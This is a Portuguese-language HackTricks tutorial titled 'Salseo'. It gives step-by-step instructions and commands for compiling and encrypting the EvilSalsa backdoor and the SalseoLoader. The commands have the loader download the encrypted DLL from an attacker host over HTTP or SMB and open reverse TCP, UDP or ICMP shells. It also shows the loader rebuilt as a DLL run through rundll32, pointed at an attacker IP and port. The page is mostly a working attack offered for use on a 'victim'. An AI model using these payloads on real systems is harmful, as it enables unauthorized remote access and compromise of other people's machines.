# Salseo

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando os binários

Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.

Compile esses projetos para a arquitetura do sistema Windows onde você vai usá-los (Se o Windows suportar x64, compile para essa arquitetura).

Você pode **selecionar a arquitetura** dentro do Visual Studio na aba **"Build"** à esquerda em **"Platform Target".**

(**Se você não encontrar essas opções, pressione na aba "Project"** e depois em **"\<Nome do Projeto> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Então, construa ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Prepare o Backdoor

Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para isso, você pode usar o script python **encrypterassembly.py** ou você pode compilar o projeto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
## **Executar o backdoor**

### **Obtendo um shell reverso TCP (baixando a dll codificada via HTTP)**

Lembre-se de iniciar um nc como o ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso UDP (baixando dll codificada via SMB)**

Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso ICMP (dll codificada já dentro da vítima)**

**Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desativar Respostas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Execute o cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro da vítima, vamos executar o salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando função principal

Abra o projeto SalseoLoader usando o Visual Studio.

### Adicione antes da função principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instale DllExport para este projeto

#### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Procure pelo pacote DllExport (usando a aba Procurar), e pressione Instalar (e aceite o popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

No seu diretório do projeto apareceram os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**

### **Desinstale** DllExport

Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Saia do Visual Studio e execute DllExport\_configure**

Apenas **saia** do Visual Studio

Depois, vá até a sua **pasta SalseoLoader** e **execute DllExport\_Configure.bat**

Selecione **x64** (se você vai usar em um sistema x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Abra o projeto novamente com o Visual Studio**

**\[DllExport]** não deve mais ser marcado como erro

![](<../.gitbook/assets/image (8) (1).png>)

### Construa a solução

Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)

![](<../.gitbook/assets/image (10) (1).png>)

Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Construir --> Alvo da plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **construir** a solução: Construir --> Construir Solução (Dentro do console de Saída o caminho da nova DLL aparecerá)

### Teste a Dll gerada

Copie e cole a Dll onde você quer testá-la.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!

## Obter um shell usando a DLL

Não se esqueça de usar um **servidor HTTP** e configurar um **listener nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
